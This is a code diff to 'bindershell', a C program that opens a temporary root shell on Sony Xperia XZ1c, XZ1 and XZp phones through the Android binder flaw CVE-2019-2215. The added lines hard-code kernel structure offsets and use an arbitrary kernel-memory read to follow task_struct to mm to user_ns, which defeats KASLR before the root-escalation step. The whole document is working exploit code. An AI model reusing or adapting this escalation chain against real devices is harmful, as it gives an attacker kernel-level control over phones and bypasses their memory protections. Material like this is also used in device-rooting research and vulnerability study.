@@ -25,6 +25,9 @@
 #include "client.h"
 #include "debug.h"
 
+#define TASK_STRUCT_MM_OFFSET 1224
+#define MM_STRUCT_USER_NS_OFFSET 752
+
 uint64_t opt_kaslr_slide;
 
 int getroot(struct offsets* o, uint64_t current_task_addr)
@@ -71,6 +74,7 @@ int main(int argc, char **argv)
 	struct offsets* o;
 	int uid;
 	uint64_t current_task_addr;
+	uint64_t addr;
 
 	PNFO("\nbindershell - temp root shell for xperia XZ1c/XZ1/XZp using CVE-2019-2215\n");
 	PNFO("https://github.com/j4nn/renoshell/tree/CVE-2019-2215\n\n");
@@ -80,8 +84,22 @@ int main(int argc, char **argv)
 		return 1;
 	}
 
-	//if (client_curr_get_kaslr(&opt_kaslr_slide) == 0)
-		PNFO("kaslr slide 0x%zx\n", opt_kaslr_slide);
+	if(!(o = get_offsets(0)))
+		return 1;
+
+	ret = read_at_address_pipe((void *)(current_task_addr + TASK_STRUCT_MM_OFFSET), &addr, sizeof(addr));
+	if (ret == 0) {
+		ret = read_at_address_pipe((void *)(addr + MM_STRUCT_USER_NS_OFFSET), &addr, sizeof(addr));
+		if (ret == 0) {
+			addr -= (uint64_t)o->init_user_ns;
+			if (addr & 0xffful) {
+				PERR("kernel slide invalid (0x%zx)\n", addr);
+			} else
+				opt_kaslr_slide = addr;
+		}
+	}
+
+	PNFO("kaslr slide 0x%zx\n", opt_kaslr_slide);
 
 	if(!(o = get_offsets(opt_kaslr_slide)))
 		return 1;
